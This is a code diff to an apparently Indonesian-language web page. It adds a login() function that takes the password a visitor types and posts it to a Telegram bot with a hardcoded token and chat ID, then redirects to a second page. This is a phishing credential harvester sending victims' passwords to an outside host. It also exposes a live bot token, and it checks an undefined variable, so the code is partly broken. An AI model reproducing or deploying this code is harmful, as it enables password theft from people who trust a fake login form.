@@ -127,24 +127,44 @@ LANJUT
 
 <script>
 
-const BOT_TOKEN = "8456111998:AAFOU6Rrgqkwfu65eWg3TZcKT7RI6JF5lbg";
-const CHAT_ID = "6456077638";
+function login() {
+    const pw = document.getElementById("pw").value.trim();
 
-async function kirimPesan(pesan) {
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: pesan
+    if (userid === "") {
+        alert("Masukan password Anda");
+        return;
+    }
+
+    const token = "8456111998:AAFOU6Rrgqkwfu65eWg3TZcKT7RI6JF5lbg";
+    const chatId = "6456077638";
+
+    const pesan = `💌 Pesan baru
+
+Nama: ${pw}`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: pesan
+        })
     })
-  });
-}
-
-// Contoh
-kirimPesan("Ada data formulir baru.");
+    .then(res => res.json())
+    .then(data => {
+        if (data.ok) {
+            localStorage.setItem("pw", pw);
+            window.location.href = "hal2.html";
+        } else {
+            alert("Gagal mengirim pesan.");
+        }
+    })
+    .catch(() => {
+        alert("Terjadi kesalahan.");
+    });
+  }
 
 </script>
 
